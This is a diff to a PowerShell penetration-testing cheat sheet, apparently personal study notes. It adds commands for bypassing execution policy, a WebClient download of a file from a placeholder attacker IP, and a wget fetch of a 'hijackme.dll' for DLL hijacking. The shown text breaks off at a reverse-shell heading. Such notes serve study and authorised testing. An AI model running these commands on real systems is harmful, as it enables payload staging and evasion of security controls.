@@ -4,6 +4,7 @@ tags:
   - "#attack/reconnaissance/active"
   - "#attack/discovery"
   - "#attack/command-and-control"
+  - "#attack/defense-evasion"
 ---
 # Fundamentals
 Can directly execute encoded commands
@@ -43,11 +44,26 @@ $env:USERDOMAIN
 ```powershell
 Test-NetConnection -Port 445 192.168.50.151
 ```
+## Defense Evasion
+Circumvent PowerShell execution policies.
+**Note:** Execution Policies can be enforced by Group Policies.
+
+| Command                                                                | Purpose                                |
+| ---------------------------------------------------------------------- | -------------------------------------- |
+| `<script> -ExecutionPolicy Bypass`                                     | Disable on per-script basis            |
+| `Get-ExecutionPolicy -Scope CurrentUser`                               | Show execution policy for current user |
+| `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` | Disable for current user               |
 ## Command and Control
-#### download file 
+#### Download a File
+using System.Net.Webclient
+```powershell
+C:powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<file>','<local_path>')
+```
+using wget:
 ```powershell
 wget -O hijackme.dll IP:PORT/hijackme.dll
 ```
+
 #### Reverse Shell Payloads
 powershell reverse shell:
 ```powershell
